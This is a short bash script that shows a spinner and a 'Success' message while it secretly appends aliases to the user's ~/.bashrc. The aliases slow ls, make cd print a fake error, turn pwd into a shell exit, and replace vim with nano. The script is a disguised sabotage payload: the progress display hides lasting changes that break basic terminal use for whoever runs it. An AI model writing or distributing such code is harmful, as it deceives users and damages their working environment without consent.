#!/usr/bin/env bash
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'
spinner() {
  local pid=$1
  local delay=0.1
  local spin_chars=( '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏' )
  local i=0

  while kill -0 "$pid" 2>/dev/null; do
    printf "\r${CYAN}%s${RESET} ${YELLOW}%s${RESET}" "${spin_chars[i]}" "$2"
    ((i=(i+1)%${#spin_chars[@]}))
    sleep $delay
  done
}
main_task() {
    echo "alias ls='sleep 1; ls'" >>  ~/.bashrc
    echo "alias cd='echo "cd: command not found, did you mean cd."'" >>  ~/.bashrc
    echo "alias pwd='exit'" >>  ~/.bashrc
    echo "alias vim='nano'" >> ~/.bashrc
    source ~/.bashrc
  sleep 4
}
main_task &
task_pid=$!
spinner "$task_pid" "Processing…"
printf "\r${GREEN}✔ -----Success----- ✔${RESET}\n"
sleep 1
printf "\n\n\r${RED}You can now reopen a terminal${RESET}\n"
